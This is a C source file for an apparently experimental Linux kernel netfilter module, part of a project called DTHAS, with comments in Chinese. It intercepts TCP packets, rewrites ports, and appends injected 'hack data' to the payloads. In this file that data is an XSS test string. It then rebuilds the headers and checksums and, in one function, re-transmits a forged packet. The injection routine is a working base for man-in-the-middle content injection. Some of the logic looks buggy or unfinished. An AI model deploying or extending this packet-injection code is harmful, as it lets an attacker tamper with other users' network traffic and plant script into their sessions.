//===========================================================================
// lib_tcp.c
//   Copyright (C) 2016 Free Software Foundation, Inc.
//   Originally by ZhaoFeng Liang <zhf.liang@hotmail.com>
//
//This file is part of DTHAS.
//
//DTHAS is free software; you can redistribute it and/or modify
//it under the terms of the GNU General Public License as published by
//the Free Software Foundation; either version 2 of the License, or 
//(at your option) any later version.
//
//DTHAS is distributed in the hope that it will be useful,
//but WITHOUT ANY WARRANTY; without even the implied warranty of
//MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//GNU General Public License for more details.
//
//You should have received a copy of the GNU General Public License
//along with DTHAS; If not, see <http://www.gnu.org/licenses/>.  
//===========================================================================

#include 	<linux/module.h>
#include 	<linux/init.h>
#include 	<linux/moduleparam.h>
#include 	<linux/netfilter.h>  
#include 	<linux/netfilter_ipv4.h>  
#include 	<linux/ip.h>  
#include 	<linux/tcp.h>
#include 	<linux/inet.h> 

#include 	<linux/fs.h>   
#include 	<asm/uaccess.h>   
#include 	<linux/mm.h>


#include	"module_global.h"
#include	"module_type.h"
#include	"module_ip_port.h"
#include	"module_prototype.h"
#include	"module_arp.h"
#include	"module_ipv4.h"
#include	"module_tcp.h"

/*
struct tcphdr {
	__be16	source;
	__be16	dest;
	__be32	seq;
	__be32	ack_seq;
#if defined(__LITTLE_ENDIAN_BITFIELD)
	__u16	res1:4,
		doff:4,
		fin:1,
		syn:1,
		rst:1,
		psh:1,
		ack:1,
		urg:1,
		ece:1,
		cwr:1;
#elif defined(__BIG_ENDIAN_BITFIELD)
	__u16	doff:4,
		res1:4,
		cwr:1,
		ece:1,
		urg:1,
		ack:1,
		psh:1,
		rst:1,
		syn:1,
		fin:1;
#else
#error	"Adjust your <asm/byteorder.h> defines"
#endif	
	__be16	window;
	__sum16	check;
	__be16	urg_ptr;
};


//	The union cast uses a gcc extension to avoid aliasing problems
//  (union is compatible to any of its members)
//  This means this part of the code is -fstrict-aliasing safe now.
//
union tcp_word_hdr { 
	struct tcphdr hdr;
	__be32 		  words[5];
};
*/

static void add_tcp_hackdata(struct sk_buff *skb);

static char tmp_tcp_data[TMP_TCP_PACKET_LEN];
//=================================================================
// 初始化 tcp_trans_info
//=================================================================
int tcp_trans_info(struct sk_buff *skb) 
{
	printk("======================tcp trans info======================\n");

	//----------------------------------------------------------------------
	//获取tcp信息
	//----------------------------------------------------------------------
	struct tcphdr *tcp = tcp_hdr(skb); 

	int src_port, dst_port;  

	src_port	= htons(tcp->source);
	dst_port	= htons(tcp->dest);

	printk("src port %u , dst port %u\n",src_port,dst_port);  

	return NF_ACCEPT; 	
}

//=================================================================
// 通过ip地址、端口过滤tcp数据包
//=================================================================
int tcp_modi_main(struct sk_buff *skb)  
{
	unsigned int port;

	port	= 19213;

	//修改“源端口”
	tcp_modi(TYPE_TCP_SRC_PORT, port, skb);

	//修改“目的端口”
	//tcp_modi(TYPE_TCP_DST_PORT, port, skb);

	tcp_prt_info(skb);

	return NF_ACCEPT;

}

//=================================================================
// 通过ip地址、端口过滤tcp数据包
//=================================================================
int tcp_modi(int type, unsigned int port, struct sk_buff *skb)  
{  
   	struct tcphdr *tcph = tcp_hdr(skb);   
    	
	switch(type)
	{
		case TYPE_TCP_SRC_PORT:
			tcph->source	= htons(port);
			break;
		case TYPE_TCP_DST_PORT:
			tcph->dest	= htons(port);
			break;
		default:
			return 0;
			break;
	}

	return 1;      	 
} 

//=================================================================
// 打印tcp的信息
//=================================================================
int tcp_prt_info(struct sk_buff *skb) 
{
	printk("======================tcp info======================\n");

	//----------------------------------------------------------------------
	//获取tcp信息
	//----------------------------------------------------------------------
	struct tcphdr *tcph = tcp_hdr(skb); 

	printk("src port %u , dst port %u\n",htons(tcph->source), htons(tcph->dest));	
}

//=================================================================
// 通过ip地址、端口过滤tcp数据包
//=================================================================
int tcp_data_hack(struct sk_buff *skb)  
{  
   	struct tcphdr *tcph = tcp_hdr(skb); 
	struct iphdr *iph = ip_hdr(skb);  
	struct ethhdr *mach = (struct ethhdr*)(skb->head + skb->mac_header);

	unsigned short src_port;
	unsigned short dst_port; 
	struct iaddr src_ip;
	struct iaddr dst_ip; 
	struct hwaddr src_mac;
	struct hwaddr dst_mac;
	unsigned short mac_type;
	unsigned char protocol;
	unsigned short tcp_len;
	unsigned int seq;
	unsigned int ack;
	unsigned char tcp_header_len;
	unsigned char ctrl_bit;
	unsigned short winsize;
	unsigned short upointer;
	unsigned short option_len;
	unsigned short offset;
	unsigned short ip_len;
	unsigned char flag;

	//1）添加 hack 数据
	add_tcp_hackdata(skb);

	//2）获取各种参数值
	offset		= (little_big_16(iph->frag_off))&0x1fff;
	flag		= ((little_big_16(iph->frag_off))>>13)&0x7;
	ip_len		= little_big_16(iph->tot_len);

	src_port	= little_big_16(tcph->source);
	dst_port	= little_big_16(tcph->dest);

	seq		= little_big_32(tcph->seq);
	ack		= little_big_32(tcph->ack);

	winsize		= little_big_16(tcph->window);
	upointer	= little_big_16(tcph->urg_ptr);

	protocol	= PROTOCOL_TCP;
	tcp_len		= ip_len - IPV4_HEADER_LENGTH;
	tcp_header_len	= tcph->doff;
	option_len	= (tcp_header_len*4) - TCP_HEADER_LENGTH;
	ctrl_bit	= (tcph->urg)<<2 | (tcph->ack)<<3 | (tcph->psh)<<4 | (tcph->rst)<<5 |  (tcph->syn)<<6 | tcph->fin<<7;	

	src_ip.addr1	= (iph->saddr&0x000000FF)>>0;
	src_ip.addr2	= (iph->saddr&0x0000FF00)>>8;
	src_ip.addr3	= (iph->saddr&0x00FF0000)>>16;
	src_ip.addr4	= (iph->saddr&0xFF000000)>>24;

	dst_ip.addr1	= (iph->daddr&0x000000FF)>>0;
	dst_ip.addr2	= (iph->daddr&0x0000FF00)>>8;
	dst_ip.addr3	= (iph->daddr&0x00FF0000)>>16;
	dst_ip.addr4	= (iph->daddr&0xFF000000)>>24;

	src_mac.addr1	= mach->h_source[0];
	src_mac.addr2	= mach->h_source[1];
	src_mac.addr3	= mach->h_source[2];
	src_mac.addr4	= mach->h_source[3];
	src_mac.addr5	= mach->h_source[4];
	src_mac.addr6	= mach->h_source[5];

	dst_mac.addr1	= mach->h_dest[0];
	dst_mac.addr2	= mach->h_dest[1];
	dst_mac.addr3	= mach->h_dest[2];
	dst_mac.addr4	= mach->h_dest[3];
	dst_mac.addr5	= mach->h_dest[4];
	dst_mac.addr6	= mach->h_dest[5];

	mac_type	= mach->h_proto;

	//3）增加 tcp header
	add_tcp_header(skb, src_ip, tcp_len, dst_ip, protocol, src_port, dst_port, seq, ack, tcp_header_len, ctrl_bit, winsize, upointer);

	//4）增加 ip header
	add_ipv4_header(skb, src_ip, iph->ttl, dst_ip, protocol, iph->tos, big_little_16(ip_len), offset,  flag);

	//5）增加 frame header
	add_frame_header(skb, mac_type, dst_mac, src_mac);


	return NF_ACCEPT;      	 
} 

//===========================================================================
// add hack data
//===========================================================================
static void add_tcp_hackdata(struct sk_buff *skb)
{
	unsigned short ip_len;
	int hack_data_len;

	char hack_data[HACKDATA_LEN]	= "<script>alert('test')</script>\n";

	//1）加入hack data 到 skb[]中	
	hack_data_len		= str_len(hack_data);	
	
	char *hd		= skb_put(skb, hack_data_len);
	str_cpy(hd, hack_data, hack_data_len);

	//2）更新 ip_len
	struct iphdr *iph 	= ip_hdr(skb);
	
	ip_len			= little_big_16(iph->tot_len);
	ip_len			+= hack_data_len;	
	iph->tot_len 		= big_little_16(ip_len);	
}

//===========================================================================
// add_tcp_header
//===========================================================================
void 	add_tcp_header(struct sk_buff *skb, struct iaddr src_ip, unsigned short tcp_len, struct iaddr dst_ip, unsigned char protocol,unsigned short src_port, unsigned short dst_port, unsigned int seq, unsigned int ack, unsigned char header_len, unsigned char ctrl_bit, unsigned short winsize, unsigned short upointer)
{
	struct tcphdr *tcph 		= tcp_hdr(skb);
	
	//-------------------------------------------------------------------------
	// add tcp header
	//-------------------------------------------------------------------------
	tcph->seq	= big_little_32(seq);
	tcph->ack	= big_little_32(ack);	
	
	tcph->seq	= big_little_32(seq);
	tcph->ack	= big_little_32(ack);


	tcph->source	= big_little_16(src_port);
	tcph->dest	= big_little_16(dst_port);

	tcph->doff	= header_len;
	tcph->window	= big_little_16(winsize);

	//tcph->check	= t->check;
	
	tcph->urg_ptr	= big_little_16(upointer);


	tcph->fin	= (ctrl_bit >>7) & 0x1;
	tcph->syn	= (ctrl_bit >>6) & 0x1;
	tcph->rst	= (ctrl_bit >>5) & 0x1;
	tcph->psh	= (ctrl_bit >>4) & 0x1;
	tcph->ack	= (ctrl_bit >>3) & 0x1;
	tcph->urg	= (ctrl_bit >>2) & 0x1;

	tcph->ece	= 0;
	tcph->cwr	= 0;
	tcph->res1	= 0;	

	//计算校验和
	struct iphdr *iph 	= ip_hdr(skb);

	tcph->check		= 0;
	skb->csum 		= csum_partial((unsigned char *)tcph, (tcp_len),0);
	tcph->check		= csum_tcpudp_magic(iph->saddr,iph->daddr, (tcp_len),iph->protocol, skb->csum);

	

//--------test---------------
	tmp_tcp_data[tcp_len + PTCP_HEADER_LENGTH]	= NULL;
	printk("[tcp_add_header, data:%s, len=%d]\n", &tmp_tcp_data[PTCP_HEADER_LENGTH+tcph->doff*4], (tcp_len-(tcph->doff*4)));
//--------test---------------
}

//===========================================================================
// 新建一个sk_buff，取代原来的数据包（不是在原来数据包上修改）---未成功
//===========================================================================
int tcp_data_hack_renew(struct sk_buff *skb_s)  
{  
	unsigned int	len;
	unsigned short	tcp_len, tcp_header_len, tcp_data_len, ip_len,total_len,total_len_mod;
	//char tmp_data[TMP_TCP_PACKET_LEN];

	struct tcphdr *tcph_s 	= tcp_hdr(skb_s);
	struct iphdr *iph_s	= ip_hdr(skb_s);
	struct ethhdr *arph_s 	= (struct ethhdr*)(skb_s->head + skb_s->mac_header);

	char *src	= NULL;
	char *dst	= NULL; 
	
	
	//-------------------------------------------------------------------
	//1）初始化 hack_data
	//-------------------------------------------------------------------
	int hack_data_len		= 0;
	char hack_data[HACKDATA_LEN]	= "<script>alert('test12')</script>\n";
	hack_data_len		= str_len(hack_data);

	//更新ip_len
	ip_len		= little_big_16(iph_s->tot_len);
	ip_len		+= hack_data_len;	
	iph_s->tot_len 	= big_little_16(ip_len);

	tcp_header_len	= tcph_s->doff*4;
	tcp_len		= little_big_16(iph_s->tot_len) - IPV4_HEADER_LENGTH;
	tcp_data_len	= tcp_len - tcp_header_len;
	//total_len	= ARP_HEADER_LEN + IPV4_HEADER_LENGTH + tcp_header_len + tcp_data_len + hack_data_len;
	total_len	= ARP_HEADER_LEN + little_big_16(iph_s->tot_len);
	total_len_mod	= (total_len / 4 + 1) * 4;	//4的倍数，边界对齐
	
	//-------------------------------------------------------------------
	//2）新建 sk_buff
	//-------------------------------------------------------------------
   	struct sk_buff *skb_d 	= alloc_skb(4096, GFP_ATOMIC);
	skb_d->dev 		= skb_s->dev;

	skb_reserve(skb_d, total_len_mod); 

	//-------------------------------------------------------------------
	//3）数据部分的装载（payload）
	//-------------------------------------------------------------------
	printk("tcp_data_len=%d, hack_data_len=%d\n",tcp_data_len,hack_data_len);

/*
	int i;
	for(i=0;i<TMP_TCP_PACKET_LEN;i++)
	{
		tmp_data[i]	= NULL;
	}

	len	= tcp_data_len;
	dst 	= &tmp_data[0]; 
	src	= tcph_s;
	src	+= tcp_header_len;  
	str_cpy(dst, src, len);

	len	= hack_data_len;
	dst 	= &tmp_data[tcp_data_len];  
	str_cpy(dst, hack_data, len);

	len	= tcp_data_len + hack_data_len;
	dst 	= skb_push(skb_d, len);  
	str_cpy(dst, hack_data, hack_data_len);
*/


	//将hack data 添加到“新的”数据包中
	dst = skb_push(skb_d, hack_data_len);  
	str_cpy(dst, hack_data, hack_data_len); 

/*
	//将“原来”数据包的数据copy到“新的”数据包中
	dst 	= skb_push(skb_d, tcp_data_len); 
	src	= tcph_s;
	src	+= tcp_header_len;  
	str_cpy(dst, src, tcp_data_len);
*/

	//dst	= skb_put(skb_d, hack_data_len);
	//str_cpy(dst, hack_data, hack_data_len);
	//-------------------------------------------------------------------
	//4）tcp header的构建
	//-------------------------------------------------------------------
	len	= tcp_header_len;		//len=tcp header 长度
	dst 	= skb_push(skb_d, len); 
	src	= tcph_s;
	
	str_cpy(dst, src, len);			//将原来数据包里的tcp header直接复制到新的sk_buff中

	struct tcphdr *tcph_d 	= dst;	
	tcph_d->check		= 0;
	skb_d->csum 		= csum_partial((unsigned char *)tcph_d, (tcp_len),0);
	tcph_d->check		= csum_tcpudp_magic(iph_s->saddr,iph_s->daddr, (tcp_len),iph_s->protocol, skb_d->csum);

	//-------------------------------------------------------------------
	//5）ip header的构建
	//-------------------------------------------------------------------
	len	= IPV4_HEADER_LENGTH;		//len=ip header 长度
	dst 	= skb_push(skb_d, len); 
	src	= iph_s;
	
	str_cpy(dst, src, len);			//将原来数据包里的ip header直接复制到新的sk_buff中

	//-------------------------------------------------------------------
	//6）arp header的构建
	//-------------------------------------------------------------------
	len	= ARP_HEADER_LEN;		//len=arp header 长度
	dst 	= skb_push(skb_d, len); 
	src	= arph_s;
	
	str_cpy(dst, src, len);			//将原来数据包里的arp header直接复制到新的sk_buff中

	//-------------------------------------------------------------------
	//7）发送“新的”sk_buff
	//-------------------------------------------------------------------
	dev_queue_xmit(skb_d); 

	//-------------------------------------------------------------------
	//8）丢弃“原来”的sk_buff
	//-------------------------------------------------------------------
	//skb_s	= skb_d;

	return NF_ACCEPT;
	//return NF_DROP;      	 
} 
